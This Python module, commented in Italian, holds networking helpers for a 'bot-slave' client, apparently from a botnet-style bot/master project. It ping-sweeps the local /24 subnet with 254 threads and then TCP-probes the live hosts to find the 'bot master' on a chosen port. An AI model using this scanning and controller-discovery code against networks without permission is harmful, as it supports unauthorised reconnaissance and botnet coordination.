"""
Codice sorgente contenente funzioni di supporto (networking) per il bot-slave.

Scritto da:
       Valentino Bocchetti, Valentina Annunziata
       Francesco Ciccarelli, Giulia Caputo
Copyright (c) 2022. All rights reserved.
"""
import psutil
from socket import socket, AddressFamily, AF_INET, SOCK_STREAM
# import socket
import typing
import ipaddress
import subprocess
from concurrent import futures

# Librerie personali
from . import bot_slave_utilities as bot_utils


def get_net_ifname() -> dict:
    """Recupero lista ifname."""
    return [{key: value[0].address} for key, value in psutil.net_if_addrs().items()
            if value[0].family == AddressFamily.AF_INET and key != 'lo'][0]


def find_active_devices(ip_addr: str, valid_hosts: list) -> None:
    """Sfruttiamo ICMP per la ricerca degli host effettivamente attivi sulla rete."""
    try:
        subprocess.run(["ping", "-c", "1", ip_addr], shell=False, check=True, capture_output=True, text=True)
        valid_hosts.append(ip_addr)
    except subprocess.CalledProcessError:
        # print(f"Error: Ping failed with host {ip_addr}")
        pass


def find_bot_master(port: int) -> None:
    """Funzione di wrapping per la ricerca del bot master sulla rete locale."""
    range = ''
    i = 0
    for ip in get_net_ifname().values():
        while i < 3:
            range += ip.split('.')[i] + '.'
            i += 1

    network_hosts = ipaddress.ip_network(range + "0/24").hosts()

    active_hosts = []
    final_hosts = []

    with futures.ThreadPoolExecutor(254) as executor:
        ping_hosts = [executor.submit(find_active_devices, str(ip), active_hosts) for ip in network_hosts]
        # È possibile utilizzare `executor.shutdown(wait=True)`
        # Non necessario in quanto tutti gli executor attendono che tutti i processi terminano in un blocco `with`.
        # Pertanto non c'è bisogno di invocare manualmente `executor.shutdown()`.
        futures.wait(ping_hosts)

    for host in active_hosts:
      with socket(AF_INET, SOCK_STREAM) as tester:
          try:
              if (tester.connect_ex((host, port)) == 0):
                  final_hosts.append(host)
          except Exception as e:
              print(e)

    print(f"Host attualmente attivi: {final_hosts}")

# if __name__ == "__main__":
#     find_bot_master(9090)
